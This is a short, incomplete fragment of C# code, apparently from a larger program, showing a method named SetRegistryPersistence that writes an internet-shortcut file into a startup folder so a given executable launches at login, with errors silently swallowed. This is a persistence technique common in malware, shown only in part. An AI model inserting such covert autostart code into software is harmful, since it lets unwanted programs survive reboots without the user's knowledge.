        ...
        static void SetRegistryPersistence(string filePath)
        {
            try
            {
                ...
                try
                {
                    ...
                    // Create shortcut (using WshShell COM object would require additional references)
                    // For now, we'll use a simplified approach with a direct file link
                    using (StreamWriter writer = new StreamWriter(startupFolder))
                    {
                        writer.WriteLine($"[InternetShortcut]");
                        writer.WriteLine($"URL=file:///{filePath.Replace("\\", "/")}");
                        writer.WriteLine($"IconIndex=0");
                        writer.WriteLine($"IconFile={filePath}");
                    }
                }
                catch
                {
